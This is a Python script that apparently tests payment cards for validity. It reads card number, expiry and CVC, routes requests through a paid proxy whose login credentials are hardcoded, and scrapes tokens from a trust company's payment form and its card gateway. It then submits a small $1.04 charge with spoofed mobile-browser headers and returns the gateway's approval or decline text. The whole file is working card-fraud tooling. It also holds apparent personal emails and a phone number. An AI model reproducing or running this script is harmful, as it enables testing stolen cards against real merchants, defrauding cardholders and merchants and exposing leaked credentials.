import requests,re
from proxy import reqproxy, make_request
def Tele(ccx):
	proxy_str = "brd.superproxy.io:33335:brd-customer-hl_184b6dff-zone-ccworld:tnkilbv66jns"
	session, ip = reqproxy(proxy_str)
	#print(f"IP Address: {ip}")
	ccx=ccx.strip()
	n = ccx.split("|")[0]
	mm = ccx.split("|")[1]
	yy = ccx.split("|")[2]
	cvc = ccx.split("|")[3]
	if n.startswith("4"):
		Type = "1"
	if n.startswith("5"):
		Type = "2"
	if "01" in mm or "02" in mm or "03" in mm or "04" in mm or "05" in mm or "06" in mm or "07" in mm or "08" in mm or "09" in mm:
		mm = mm.split("0")[1]
	if "20" in yy:
		yy = yy.split("20")[1]
	r = requests.session()

	headers = {
	    'authority': 'acmetrustnevis.com',
	    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
	    'accept-language': 'en-TH,en;q=0.9,th-DZ;q=0.8,th;q=0.7,en-GB;q=0.6,en-US;q=0.5',
	    'referer': 'https://acmetrustnevis.com/payment/',
	    'sec-ch-ua': '"Not A(Brand";v="8", "Chromium";v="132"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'iframe',
	    'sec-fetch-mode': 'navigate',
	    'sec-fetch-site': 'same-origin',
	    'upgrade-insecure-requests': '1',
	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36',
	}
	
	response = session.get('https://acmetrustnevis.com/payment-form/', headers=headers)
	
	MERCHKEY = re.search(r'name="MERCHKEY" value="(.*?)"', response.text).group(1)
	#print(MERCHKEY)
	TRANID = re.search(r'name="TRANID" value="(.*?)"', response.text).group(1)
	#print(TRANID)
	
	
	headers = {
	    'authority': 'acmetrustnevis.com',
	    'accept': '*/*',
	    'accept-language': 'en-TH,en;q=0.9,th-DZ;q=0.8,th;q=0.7,en-GB;q=0.6,en-US;q=0.5',
	    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
	    'origin': 'https://acmetrustnevis.com',
	    'referer': 'https://acmetrustnevis.com/payment-form/',
	    'sec-ch-ua': '"Not A(Brand";v="8", "Chromium";v="132"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'empty',
	    'sec-fetch-mode': 'cors',
	    'sec-fetch-site': 'same-origin',
	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36',
	    'x-requested-with': 'XMLHttpRequest',
	}
	
	data = {
	    'name': 'Rodam User',
	    'tel': '4303000850',
	    'AMT': '1.04',
	    'client-email': 'rodamuser08@gmail.com',
	    'INVOICE': '1',
	    'payment_for': 'Foundation Registration',
	    'MERCHKEY': f'{MERCHKEY}',
	    'TRANTYPE': 'AUTHPOST',
	    'CURR': 'USD',
	    'TRANID': f'{TRANID}',
	    'URLAPPROVED': 'https://www.acmetrustnevis.com/success?err=#EM#&rc=#RC#&fc=#FC#',
	    'URLOTHER': 'https://www.acmetrustnevis.com/other?err=#EM#&rc=#RC#&fc=#FC#',
	    'notify_email': 'jc.boncamper@gmail.com',
	    'action': 'four_csonline_submit_form',
	}
	
	response = session.post('https://acmetrustnevis.com/wp-admin/admin-ajax.php', headers=headers, data=data)
	
	#print(response.text)
	
	headers = {
	    'authority': 'merchants.4csonline.com',
	    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
	    'accept-language': 'en-TH,en;q=0.9,th-DZ;q=0.8,th;q=0.7,en-GB;q=0.6,en-US;q=0.5',
	    'cache-control': 'max-age=0',
	    'content-type': 'application/x-www-form-urlencoded',
	    'origin': 'https://acmetrustnevis.com',
	    'referer': 'https://acmetrustnevis.com/',
	    'sec-ch-ua': '"Not A(Brand";v="8", "Chromium";v="132"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'iframe',
	    'sec-fetch-mode': 'navigate',
	    'sec-fetch-site': 'cross-site',
	    'sec-fetch-user': '?1',
	    'upgrade-insecure-requests': '1',
	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36',
	}
	
	data = {
	    'name': 'Rodam User',
	    'tel': '4303000850',
	    'AMT': '1.04',
	    'client-email': 'rodamuser08@gmail.com',
	    'INVOICE': '1',
	    'payment_for': 'Foundation Registration',
	    'MERCHKEY': f'{MERCHKEY}',
	    'TRANTYPE': 'AUTHPOST',
	    'CURR': 'USD',
	    'TRANID': f'{TRANID}',
	    'URLAPPROVED': 'https://www.acmetrustnevis.com/success?err=#EM#&rc=#RC#&fc=#FC#',
	    'URLOTHER': 'https://www.acmetrustnevis.com/other?err=#EM#&rc=#RC#&fc=#FC#',
	    'notify_email': 'jc.boncamper@gmail.com',
	}
	
	response = session.post('https://merchants.4csonline.com/TranSvcs/tp.aspx', headers=headers, data=data)
	
	VIEWSTATE = re.search(r'name="__VIEWSTATE" id="__VIEWSTATE" value="(.*?)"', response.text).group(1)
	#print(VIEWSTATE)
	VIEWSTATEGENERATOR = re.search(r'name="__VIEWSTATEGENERATOR" id="__VIEWSTATEGENERATOR" value="(.*?)"', response.text).group(1)
	#print(VIEWSTATEGENERATOR)
	EVENTVALIDATION = re.search(r'name="__EVENTVALIDATION" id="__EVENTVALIDATION" value="(.*?)"', response.text).group(1)
	#print(EVENTVALIDATION)
	
	headers = {
	    'authority': 'merchants.4csonline.com',
	    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
	    'accept-language': 'en-TH,en;q=0.9,th-DZ;q=0.8,th;q=0.7,en-GB;q=0.6,en-US;q=0.5',
	    'cache-control': 'max-age=0',
	    'content-type': 'application/x-www-form-urlencoded',
	    'origin': 'https://merchants.4csonline.com',
	    'referer': 'https://merchants.4csonline.com/TranSvcs/tp.aspx',
	    'sec-ch-ua': '"Not A(Brand";v="8", "Chromium";v="132"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'iframe',
	    'sec-fetch-mode': 'navigate',
	    'sec-fetch-site': 'same-origin',
	    'sec-fetch-user': '?1',
	    'upgrade-insecure-requests': '1',
	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36',
	}
	
	data = {
	    '__VIEWSTATE': f'{VIEWSTATE}',
	    '__VIEWSTATEGENERATOR': f'{VIEWSTATEGENERATOR}',
	    '__EVENTVALIDATION': f'{EVENTVALIDATION}',
	    'nif': '',
	    'CHName': 'Dao Khao Saard',
	    'CType': f'{Type}',
	    'PAN': f'{n}',
	    'ExpMonth': f'{mm}',
	    'ExpYear': f'20{yy}',
	    'CSC': f'{cvc}',
	    'Continue': 'Continue',
	}
	
	response = session.post('https://merchants.4csonline.com/TranSvcs/tp.aspx', headers=headers, data=data)
	
	try:
	    result = re.search(r'name="dc.description" content="Oh no! It seems like (.*?) You can try to&nbsp;complete the payment again&nbsp;if you think you entered your credit card information incorrectly. Please&nbsp;contact us&nbsp;if you believe there may be other issues."', response.text).group(1)
	except:
	    result = re.search(r'name="dc.description" content="(.*?) If you need to make another payment, return to the Payments page and complete the form again. If you want to get in touch, feel free to send us a message."', response.text).group(1)
	    
	return (result)
